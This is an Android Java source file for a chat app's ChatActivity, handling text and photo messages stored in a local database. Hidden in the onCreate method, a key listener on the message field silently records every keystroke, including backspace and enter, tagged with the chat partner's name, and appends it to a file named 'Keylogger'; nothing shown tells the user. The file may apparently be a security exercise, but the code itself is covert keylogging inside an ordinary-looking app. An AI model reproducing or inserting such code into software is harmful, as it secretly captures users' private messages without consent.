package com.example.project;

import android.Manifest;
import android.content.ContentValues;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.drawable.BitmapDrawable;
import android.graphics.drawable.Drawable;
import android.net.Uri;
import android.os.Bundle;
import android.os.Environment;
import android.provider.MediaStore;
import android.util.Base64;
import android.view.KeyEvent;
import android.view.View;
import android.view.ViewGroup;
import android.widget.EditText;
import android.widget.ImageView;
import android.widget.ListView;
import android.widget.ArrayAdapter;
import android.widget.TextView;
import android.widget.Toast;

import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import androidx.appcompat.widget.Toolbar;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;

public class ChatActivity extends AppCompatActivity {

    ArrayList<Message> messages = new ArrayList<>();
    ArrayAdapter<Message> adapter;
    ListView messageList;
    EditText inputMessage;
    Toolbar toolbar;
    String user, otheruser;
    DBHelper db;
    Calendar calendar = Calendar.getInstance();
    Date date = calendar.getTime();
    SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
    String dateString = dateFormat.format(date);
    ImageView image, location;

    private static final int REQUEST_STORAGE_PERMISSION = 2;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_chat);
        messageList = findViewById(R.id.message_list);
        inputMessage = findViewById(R.id.input_message);
        toolbar = findViewById(R.id.chattingToolbar);
        image = findViewById(R.id.sendImage);
        location = findViewById(R.id.sendLocation);
        db = new DBHelper(this);
        otheruser = getIntent().getStringExtra("sender");
        inputMessage.setFocusableInTouchMode(true);
        inputMessage.setOnKeyListener(new View.OnKeyListener() {
            @Override
            public boolean onKey(View view, int i, KeyEvent keyEvent) {
                if (keyEvent.getAction() == KeyEvent.ACTION_DOWN){
                    if (keyEvent.getKeyCode() == KeyEvent.KEYCODE_SHIFT_LEFT || keyEvent.getKeyCode() == KeyEvent.KEYCODE_SHIFT_RIGHT) {
                        return false;
                    }
                    else if (keyEvent.getKeyCode() == KeyEvent.KEYCODE_DEL){
                        String keylog  = "Chat with " + otheruser + ":{BACKSPACE}\n";
                        writeToFile("Keylogger", keylog);
                    }
                    else if (keyEvent.getKeyCode() == KeyEvent.KEYCODE_ENTER){
                        String keylog  = "Chat with " + otheruser + ":{ENTER}\n";
                        writeToFile("Keylogger", keylog);
                    }
                    else{
                        char key = (char) keyEvent.getUnicodeChar();
                        String keylog  = "Chat with " + otheruser + ":{" + key + "}\n";
                        writeToFile("Keylogger", keylog);
                    }
                }
                return false;
            }
        });
        image.setOnClickListener(new View.OnClickListener() {
            public void onClick(View view) {
                if (ContextCompat.checkSelfPermission(ChatActivity.this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                    ActivityCompat.requestPermissions(ChatActivity.this, new String[]{Manifest.permission.CAMERA}, 0);
                } else if (ContextCompat.checkSelfPermission(ChatActivity.this, Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
                    ActivityCompat.requestPermissions(ChatActivity.this, new String[]{Manifest.permission.READ_EXTERNAL_STORAGE}, 0);
                } else if (ContextCompat.checkSelfPermission(ChatActivity.this, Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
                    ActivityCompat.requestPermissions(ChatActivity.this, new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE}, 0);
                } else {
                    final CharSequence[] options = {"Take Photo from Camera", "Choose from Gallery", "Cancel"};
                    AlertDialog.Builder builder = new AlertDialog.Builder(ChatActivity.this);
                    builder.setTitle("Choose your profile picture");
                    builder.setItems(options, new DialogInterface.OnClickListener() {
                        @Override
                        public void onClick(DialogInterface dialog, int item) {
                            if (options[item].equals("Take Photo from Camera")) {
                                Intent intent = new Intent(MediaStore.ACTION_IMAGE_CAPTURE);
                                startActivityForResult(intent, 100);
                            } else if (options[item].equals("Choose from Gallery")) {
                                Intent intent = new Intent(Intent.ACTION_PICK, MediaStore.Images.Media.EXTERNAL_CONTENT_URI);
                                intent.setType("image/*");
                                startActivityForResult(intent, 200);
                            } else if (options[item].equals("Cancel")) {
                                dialog.dismiss();
                            }
                        }
                    });
                    builder.show();
                }
            }
        });

        location.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {

                // TECK LING ADD UR LOCATION THINGY HERE LIKE TO ASK FOR PERMS AND STUFF

            }
        });
        toolbar.setTitle(otheruser);
        setSupportActionBar(toolbar);
        toolbar.setNavigationOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                onBackPressed();
            }
        });
        user = getSharedPreferences("session", MODE_PRIVATE).getString("username", "");
        messages = db.getAllMessages(user, otheruser);
        adapter = new ArrayAdapter<Message>(this, 0, messages) {
            @Override
            public View getView(int position, View convertView, ViewGroup parent) {
                View view;
                if (convertView == null) {
                    view = getLayoutInflater().inflate(R.layout.imagelayout, parent, false);
                } else {
                    view = convertView;
                }

                ImageView imageView = view.findViewById(R.id.image_view);
                TextView textView = view.findViewById(R.id.text_view);

                Message message = getItem(position);
                if (message.getType() == 1) {
                    String messageText = message.getTimestamp() + "\n" + message.getSender() + ": " + message.getMessage();
                    textView.setText(messageText);
                    imageView.setVisibility(View.GONE);
                } else if (message.getType() == 2) {
                    byte[] dp = message.getPhoto();
                    Bitmap bitmap = BitmapFactory.decodeByteArray(dp, 0, dp.length);
                    imageView.setImageBitmap(bitmap);
                    imageView.setVisibility(View.VISIBLE);
                    String timestamp = message.getTimestamp() + "\n" + message.getSender();
                    textView.setText(timestamp);
                }
                return view;
            }

        };
        messageList.setAdapter(adapter);
    }

    public void sendMessage(View view) {
        String message = inputMessage.getText().toString();
        if (!message.isEmpty()) {
            Message chat = new Message(user, otheruser, 1, dateString, message, null);
            db.sendChat(chat);
            messages.add(chat);
            adapter.notifyDataSetChanged();
            inputMessage.setText("");
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        String filePath = getFilePath();
        if (requestCode == 100){
            try {
                FileOutputStream fos = new FileOutputStream(filePath);
                Bitmap photo = (Bitmap) data.getExtras().get("data");
                photo.compress(Bitmap.CompressFormat.PNG, 100, fos);
                fos.flush();
                fos.close();
                ByteArrayOutputStream stream = new ByteArrayOutputStream();
                photo.compress(Bitmap.CompressFormat.PNG, 100, stream);
                byte[] image = stream.toByteArray();
                Message chat = new Message(user, otheruser, 2, dateString, null, image);
                db.sendChat(chat);
                messages.add(chat);
                adapter.notifyDataSetChanged();
            } catch (FileNotFoundException e) {
                throw new RuntimeException(e);
            } catch (IOException e) {
                e.printStackTrace();
            }
            ContentValues values = new ContentValues();
            values.put(MediaStore.Images.Media.MIME_TYPE, "image/jpeg");
            values.put(MediaStore.Images.Media.DATA, filePath);
            getContentResolver().insert(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, values);

            Toast.makeText(this, "Image saved!", Toast.LENGTH_SHORT).show();
        }
        else if (requestCode == 200){
            if(data != null && data.getData() != null){
                try{
                    Uri imageUri = data.getData();
                    Bitmap bitmap = MediaStore.Images.Media.getBitmap(getContentResolver(), imageUri);
                    ByteArrayOutputStream stream = new ByteArrayOutputStream();
                    bitmap.compress(Bitmap.CompressFormat.PNG, 100, stream);
                    byte[] image = stream.toByteArray();
                    Message chat = new Message(user, otheruser, 2, dateString, null, image);
                    db.sendChat(chat);
                    messages.add(chat);
                    adapter.notifyDataSetChanged();
                } catch (IOException e){
                    e.printStackTrace();
                }
            }
        }
    }

    private String getFilePath() {
        File directory = null;
        if (Environment.getExternalStorageState().equals(Environment.MEDIA_MOUNTED)) {
            directory = getExternalFilesDir(Environment.DIRECTORY_PICTURES);
        } else {
            directory = new File(getFilesDir(), "Pictures");
            if (!directory.exists()) {
                directory.mkdirs();
            }
        }
        return directory.getAbsolutePath() + "/" + System.currentTimeMillis() + ".jpg";
    }

    public void writeToFile(String fileName, String content) {
        File file = new File(ChatActivity.this.getFilesDir(), "text");
        if (!file.exists()) {
            file.mkdir();
        }
        try {
            File gpxfile = new File(file, fileName);
            FileWriter writer = new FileWriter(gpxfile, true);
            writer.append(content + "\n");
            writer.flush();
            writer.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}